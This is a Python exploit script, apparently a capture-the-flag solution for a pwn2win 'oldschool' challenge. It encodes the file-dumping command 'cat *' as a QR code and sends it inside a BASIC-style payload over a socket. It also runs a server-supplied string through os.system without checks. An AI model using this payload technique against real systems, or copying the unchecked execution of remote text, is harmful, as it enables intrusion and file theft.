#!/usr/bin/python3

"""
Usando site https://www.the-qrcode-generator.com/ para gerar os qr codes

pip3 install pillow

"""

import socket
import requests
import re
import os
import time

host = 'oldschool.pwn2.win'
port = 12337

qr_size = 21
not_in = ''.join(list(map(chr, range(ord('@'), ord('_')+1))))
chars = {f'{a:08b}'[:2:-1]+f'{a:08b}'[1]: chr(a) for a in range(32, 127) if chr(a) not in not_in}
# chars['111111'] = '"+CHR$-1+"'

from PIL import Image


def border_size(img):
	px = img.load()
	w, h = img.size
	bs = (1, 1, 1, 1)   # (t, l, r, b)
	while sum(px[bs[0], bs[1]]) > 0:
		bs = (bs[0]+1, bs[1]+1, bs[2], bs[3])
	while sum(px[bs[0]-1, bs[1]]) == 0:
		bs = (bs[0]-1, bs[1], bs[2], bs[3])
	while sum(px[bs[0], bs[1]-1]) == 0:
		bs = (bs[0], bs[1]-1, bs[2], bs[3])
	while sum(px[bs[0], w-bs[2]-1]) > 0:
		bs = (bs[0], bs[1], bs[2]+1, bs[3])
	while sum(px[h-bs[3]-1, bs[1]]) > 0:
		bs = (bs[0], bs[1], bs[2], bs[3]+1)
	return bs


def connect():
	servidor = socket.gethostbyname(host)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((servidor, port))

	data = str(s.recv(1024), encoding='ascii')
	print(data)
	cmd = re.search(r'"([^"]+)"', data).group(1)
	os.system(cmd+' > result')
	with open('result', 'rb') as fp:
		s.send(fp.read().strip())
	return s


if __name__ == '__main__':
	cmd = 'cat *'
	fn = cmd.split()[0]+'.png'
	url = f'https://chart.googleapis.com/chart?chs=210x210&cht=qr&chl={cmd.replace(" ", "+")}&choe=UTF-8'
	r = requests.get(url=url)
	with open(fn, 'wb') as fp:
		fp.write(r.content)
	img = Image.open(fn)
	px = img.load()
	bs = border_size(img)
	w, h = img.size
	step = (w-bs[1]-bs[2])//qr_size
	qr = '00'
	for i in range(bs[0], h-bs[3], step):
		for j in range(bs[1], w-bs[2], step):
			qr += str(int(not bool(px[i, j][0])))
		qr += '0\n00'
	qr = qr.splitlines()[:-1]

	payload = '0$H.="'
	for i in range(0, len(qr), 3):
		for j in range(0, len(qr[0]), 2):
			try:
				c = qr[i][j:j+2]+qr[i+1][j:j+2]+qr[i+2][j:j+2]
				c = chars[c]
				if c == '"':
					c += '"'
				payload += c
			except Exception as err:
				raise Exception(f'{err} - i {i}/{len(qr)} j {j}/{len(qr[0])}')
	payload += '":F.L=0TO72S.12:L?H.=23:N.:V.23;1,12;0;0;'
	payload = bytes(payload, encoding='ascii')
	print('Conectando no socket...')
	s = connect()
	print(s.recv(1024))
	s.send(payload)
	print(payload, len(payload))
	time.sleep(5)
	print(s.recv(1024))
	time.sleep(5)
	print(s.recv(1024))
